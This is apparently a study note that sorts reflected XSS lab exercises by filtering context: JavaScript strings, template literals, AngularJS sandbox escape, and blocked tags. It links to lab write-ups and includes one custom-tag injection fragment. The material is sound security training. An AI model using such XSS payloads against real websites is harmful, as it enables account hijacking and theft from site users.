	- <sup>Scan results: YES</sup> [[Reflected XSS#1.x. Lab Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped ⭕️]]
- `var message`
	- Payload enclosed in backticks
		- [[Reflected XSS#1.x. Lab Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped ⭕️]]
- `var key`
	- [[Reflected XSS#1.x. Lab Reflected XSS with AngularJS sandbox escape without strings ⭕️]]
- "Tag is not allowed"
	- `<body>` / `<custom tags>` allowed
		- <sup>Scan results: YES</sup> [[Reflected XSS#1.x. Lab Reflected XSS into HTML context with most tags and attributes blocked ⭕️]]
	- `<svg>` allowed
		- [[Reflected XSS#1.x. Lab Reflected XSS with some SVG markup allowed ⭕️]]
	- `<xss+id=x>#x';` allowed
		- <sup>Scan results: YES</sup> [[Reflected XSS#1.x. Lab Reflected XSS into HTML context with all tags blocked except custom ones ⭕️]]





---

>[!info] Circle emoji ⭕️ next to Lab titles
>It means that lab has been linked to this page.


